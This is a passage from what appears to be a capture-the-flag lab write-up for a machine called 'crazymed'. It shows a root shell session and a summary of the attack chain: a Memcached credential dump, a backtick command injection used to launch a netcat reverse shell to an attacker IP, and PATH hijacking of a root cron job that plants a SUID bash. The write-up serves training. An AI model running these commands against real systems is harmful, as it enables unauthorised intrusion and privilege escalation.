brad@crazymed:/usr/local/bin$ /tmp/rootbash -p
rootbash-5.1# id
uid=1000(brad) gid=1000(brad) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),1000(brad)
rootbash-5.1# python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'
root@crazymed:/usr/local/bin# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),1000(brad)
root@crazymed:/usr/local/bin# su - root
root@crazymed:~# id
uid=0(root) gid=0(root) groups=0(root)
root@crazymed:~# whoami
root
root@crazymed:~# hostname
crazymed
```

With `euid=0`, a `python3` one-liner is used to permanently set both UID and GID to 0 (`os.setuid(0); os.setgid(0)`), and then spawn a full `/bin/bash`. This drops into a true root shell. Confirmed with `id`, `whoami`, and `hostname`.

### Step 8 — Capturing the Flags

```bash
root@crazymed:~# cat /home/brad/user.txt /root/root.txt
f70[REDACTED]
b9b[REDACTED]
```

---

## Attack Chain Summary

1. **Reconnaissance**: Full TCP port scan with `nmap -sC -sV -p- -T4` against `192.168.100.128` reveals four open ports: SSH (22), HTTP/Apache (80), a custom password-protected shell (4444), and an unauthenticated Memcached daemon (11211).

2. **Vulnerability Discovery**: Memcached 1.6.9 on port 11211 is exposed to the network without any authentication. Using `telnet` and the Memcached text protocol (`stats cachedump 1 0` + `get log`), the attacker dumps all four cached items and retrieves the plaintext credential `password: cr[REDACTED]` from the `log` key.

3. **Exploitation**: The password `cr[REDACTED]` is used to authenticate to the restricted custom shell on port 4444. The shell only permits `id`, `who`, `echo`, and `clear`, but the `echo` command does not sanitize backtick (`` ` ``) command substitution. Injecting `` echo `busybox nc 192.168.100.1 4444 -e /bin/bash` `` triggers a reverse shell, landing as user `brad`. The shell is upgraded to a full interactive TTY via `python3 pty` and `stty raw`.

4. **Internal Enumeration**: `pspy64` is transferred to the target and executed to monitor processes without root access. It reveals a root-owned cron job (`UID=0`) executing `/opt/check_VM` every minute. Inspecting the script source reveals it calls the misspelled command `eccho` (double `c`). Checking `/usr/local/bin` shows it is **world-writable** (`drwxr-xrwx`) and appears early in `$PATH`.

5. **Privilege Escalation**: A malicious `eccho` script is created in `/usr/local/bin` containing `cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash`. After one cron cycle (~60 seconds), `/tmp/rootbash` appears as a root-owned SUID binary. Running `/tmp/rootbash -p` grants `euid=0`, and a `python3` one-liner permanently sets `uid=0; gid=0`, escalating to a full root shell. Both flags are captured: `user.txt = f70[REDACTED]`, `root.txt = b9b[REDACTED]`.
